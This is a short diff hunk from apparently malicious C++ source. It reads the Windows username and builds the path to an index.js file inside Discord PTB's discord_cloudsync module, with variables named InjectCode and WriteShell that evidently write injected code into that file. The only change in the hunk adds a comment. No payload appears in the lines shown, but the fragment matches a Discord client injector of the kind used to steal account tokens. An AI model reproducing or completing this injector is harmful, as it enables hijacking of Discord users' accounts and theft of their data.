@@ -10,7 +10,7 @@
 #include <fstream>
 #include <direct.h>
 #include <random>
-char* GrabCurrentUsernameLOL= getenv("username");
+char* GrabCurrentUsernameLOL= getenv("username"); //Dont forget use Pragma
 std::string InjectCode;
 std::string path = "C:\\Users\\" + string(GrabCurrentUsernameLOL) + "\\AppData\\Local\\DiscordPTB\\app - 1.0.1008\\modules\\discord_cloudsync - 1\\discord_cloudsync\\index.js";
 std::ofstream WriteShell;
